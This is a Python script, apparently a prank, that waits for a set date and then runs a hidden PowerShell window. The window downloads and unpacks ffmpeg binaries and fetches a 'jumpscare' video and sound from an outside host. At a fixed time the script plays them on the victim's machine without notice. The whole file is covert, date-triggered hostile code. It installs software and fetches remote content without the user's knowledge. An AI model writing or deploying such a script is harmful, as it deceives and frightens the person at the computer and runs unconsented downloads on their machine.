import subprocess
import os
import datetime
import time
import shutil
import zipfile
import requests

ran = False
while True:
    today = datetime.datetime.now()
    if today.day == 17 and today.month == 11 and today.year == 2022:
        if not ran:
            save_path = os.getcwd() + "\\ffmpeg.zip"
            if not os.path.exists(os.getcwd() + "\\bin"):
                subprocess.call(["powershell", "-windowstyle hidden", "wget", "https://github.com/GyanD/codexffmpeg/releases/download/2022-11-03-git-5ccd4d3060/ffmpeg-2022-11-03-git-5ccd4d3060-full_build.zip", "-OutFile", "ffmpeg.zip"])
            try:
                with zipfile.ZipFile(save_path, 'r') as zip_ref:
                    zip_ref.extractall(os.getcwd())
            except:
                pass
            try:
                shutil.move(os.getcwd() + "\\ffmpeg-2022-11-03-git-5ccd4d3060-full_build\\bin", os.getcwd())
            except:
                pass
            try:
                os.remove(save_path)
                shutil.rmtree(os.getcwd() + "\\ffmpeg-2022-11-03-git-5ccd4d3060-full_build")
            except:
                pass
            os.environ["PATH"] += os.pathsep + os.getcwd() + "\\bin"
            ran = True
            jumpscare_url = "https://i.file.glass/63d5fa.mp4"
            sound_url = "https://i.file.glass/5c7039.webm"
            # download and save jumpscare_url mp4 file to the current dir
            r = requests.get(jumpscare_url, allow_redirects=True)
            open('jumpscare.mp4', 'wb').write(r.content)
            r2 = requests.get(sound_url, allow_redirects=True)
            open('sound.webm', 'wb').write(r2.content)
            os.system("ffmpeg -i sound.webm outro.mp3")  
        today = datetime.datetime.now()
        if today.hour == 12 and today.minute == 55:
            os.system("ffplay -autoexit -nodisp -hide_banner -loglevel panic outro.mp3")
            os.system("ffplay -autoexit jumpscare.mp4")
    else:
        time.sleep(3600)

